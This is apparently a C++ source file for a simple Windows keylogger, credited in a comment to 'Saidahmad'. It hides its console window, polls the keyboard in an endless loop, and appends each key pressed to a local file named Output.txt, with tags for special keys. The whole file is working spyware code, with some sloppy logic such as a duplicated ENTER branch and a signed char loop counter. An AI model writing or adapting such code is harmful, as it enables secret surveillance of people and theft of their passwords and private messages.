#include <Windows.h>
#include <iostream>
#include <fstream>

using namespace std;

int Save(int _key, const char *file);

int main()
{
	FreeConsole();
	setlocale(LC_ALL, "ru");
	
	char i;
	while (true)
	{
		Sleep(10);
		for  (i = 8; i <= 255; i++)
		{
			if (GetAsyncKeyState(i) == -32767) {
				Save(i, "Output.txt");
			}
		}
	}
}

int Save(int _key, const char *file) {
	cout << _key << endl;
	Sleep(10);
	FILE* OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");




	if (_key == VK_LSHIFT)
	{
		fprintf(OUTPUT_FILE, "%s", "[LSHIFT]");
	}
	else if (_key == VK_RSHIFT)
	{
		fprintf(OUTPUT_FILE, "%s", "[RSHIFT]");
	}
	else if (_key == VK_ESCAPE)
	{
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	}
	else if (_key == VK_DELETE)
	{
		fprintf(OUTPUT_FILE, "%s", "[DELETE]");
	}
	else if (_key == VK_BACK)
	{
		fprintf(OUTPUT_FILE, "%s", "[BACK]");
	}
	else if (_key == VK_CAPITAL)
	{
		fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
	}
	else if (_key == VK_RCONTROL)
	{
		fprintf(OUTPUT_FILE, "%s", "[RCONTROL]");
	}
	else if (_key == VK_LCONTROL)
	{
		fprintf(OUTPUT_FILE, "%s", "[LCONTROL]");
	}
	else if (_key == VK_RETURN)
	{
		fprintf(OUTPUT_FILE, "%s", "[ENTER]");
	}
	else if (_key == VK_MENU)
	{
		fprintf(OUTPUT_FILE, "%s", "[ALT]");
	}
	else if (_key == VK_RETURN)
	{
		fprintf(OUTPUT_FILE, "%s", "[ENTER]");
	}
	if (_key == QS_MOUSEBUTTON)
	{
		fprintf(OUTPUT_FILE, "%s", "[MBUTTON]");
	}
	if (_key == QS_MOUSEMOVE)
	{
		fprintf(OUTPUT_FILE, "%s", "[MOUSEMOVE]");
	}
	if (_key == VK_LBUTTON)
	{
		fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
	}
	if (_key == VK_RBUTTON)
	{
		fprintf(OUTPUT_FILE, "%s", "[RBUTTON]");
	}


	if (_key == VK_F1)
	{
		fprintf(OUTPUT_FILE, "%s", "[F1]");
	}
	if (_key == VK_F2)
	{
		fprintf(OUTPUT_FILE, "%s", "[F2]");
	}
	if (_key == VK_F3)
	{
		fprintf(OUTPUT_FILE, "%s", "[F3]");
	}
	if (_key == VK_F4)
	{
		fprintf(OUTPUT_FILE, "%s", "[F4]");
	}
	if (_key == VK_F5)
	{
		fprintf(OUTPUT_FILE, "%s", "[F5]");
	}
	if (_key == VK_F6)
	{
		fprintf(OUTPUT_FILE, "%s", "[F6]");
	}
	if (_key == VK_F7)
	{
		fprintf(OUTPUT_FILE, "%s", "[F7]");
	}
	if (_key == VK_F8)
	{
		fprintf(OUTPUT_FILE, "%s", "[F8]");
	}
	if (_key == VK_F9)
	{
		fprintf(OUTPUT_FILE, "%s", "[F9]");
	}
	if (_key == VK_F10)
	{
		fprintf(OUTPUT_FILE, "%s", "[F10]");
	}
	if (_key == VK_F11)
	{
		fprintf(OUTPUT_FILE, "%s", "[F11]");
	}
	if (_key == VK_F12)
	{
		fprintf(OUTPUT_FILE, "%s", "[F12]");
	}
	if (_key == VK_NUMLOCK)
	{
		fprintf(OUTPUT_FILE, "%s", "[NUMLOCK]");
	}





	/*
	Made by Saidahmad
	
	*/






	fprintf(OUTPUT_FILE, "%s", &_key);

	fclose(OUTPUT_FILE);

	return 0;

}